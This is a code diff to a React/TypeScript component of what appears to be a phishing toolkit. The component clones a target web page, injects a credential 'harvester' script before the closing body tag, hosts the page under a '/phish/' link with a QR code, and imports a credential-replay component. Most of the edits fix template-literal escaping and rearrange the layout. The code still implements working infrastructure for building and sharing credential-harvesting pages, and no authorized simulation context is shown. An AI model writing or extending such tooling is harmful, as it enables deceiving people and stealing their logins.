@@ -23,6 +23,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
+import { hostTestPage } from '@/actions/host-test-page-action';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -217,15 +218,15 @@ export default function PhishingPage() {
       // Inject <base> tag to fix relative links
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, \`<head>\\n<base href="${baseHrefUrl}">\`);
+          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
         } else {
-          html = \`<head><base href="${baseHrefUrl}"></head>\${html}\`;
+          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
       }
 
       // Inject harvester script
       if (html.includes('</body>')) {
-          html = html.replace(/<\/body>/i, \`${harvesterScript}</body>\`);
+          html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
       } else {
           html += harvesterScript;
       }
@@ -243,13 +244,14 @@ export default function PhishingPage() {
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
+    setHostedUrl(null);
     
     try {
         const pageId = crypto.randomUUID();
-        const pageStorageKey = \`phishing-html-\${pageId}\`;
+        const pageStorageKey = `phishing-html-${pageId}`;
         localStorage.setItem(pageStorageKey, modifiedHtml);
 
-        const finalUrl = \`\${window.location.origin}/phish/\${pageId}\`;
+        const finalUrl = `${window.location.origin}/phish/${pageId}`;
         setHostedUrl(finalUrl);
         toast({ title: "Local Link Generated!", description: "Your phishing page is now accessible." });
 
@@ -257,7 +259,7 @@ export default function PhishingPage() {
         logActivity({
             user: user?.displayName || 'Operator',
             action: 'Generated Phishing Link',
-            details: \`Source: \${urlToClone || 'Pasted HTML'}\`,
+            details: `Source: ${urlToClone || 'Pasted HTML'}`,
         });
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
@@ -394,7 +396,7 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">Generate Link</CardTitle>
+                        <CardTitle className="text-xl">Generate & Save</CardTitle>
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
@@ -429,23 +431,22 @@ export default function PhishingPage() {
             </Card>
           
           {hostedUrl && (
-             <Card>
-               <CardHeader>
-                 <CardTitle>Hosted Page URL</CardTitle>
-                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
-               </CardHeader>
-               <CardContent className="space-y-4">
-                 <div className="flex w-full items-center gap-2">
-                   <Input readOnly value={hostedUrl} className="font-mono" />
-                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
-                     <Clipboard className="h-4 w-4" />
-                   </Button>
-                 </div>
-                 <div className="flex justify-center">
-                   <QrCodeGenerator url={hostedUrl} />
-                 </div>
-               </CardContent>
-             </Card>
+             <div className="grid md:grid-cols-2 gap-4">
+                <Card>
+                    <CardHeader>
+                        <CardTitle>Hosted Page URL</CardTitle>
+                    </CardHeader>
+                    <CardContent>
+                        <div className="flex w-full items-center gap-2">
+                            <Input readOnly value={hostedUrl} className="font-mono" />
+                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                                <Clipboard className="h-4 w-4" />
+                            </Button>
+                        </div>
+                    </CardContent>
+                </Card>
+                <QrCodeGenerator url={hostedUrl} />
+             </div>
            )}
 
             <Card>
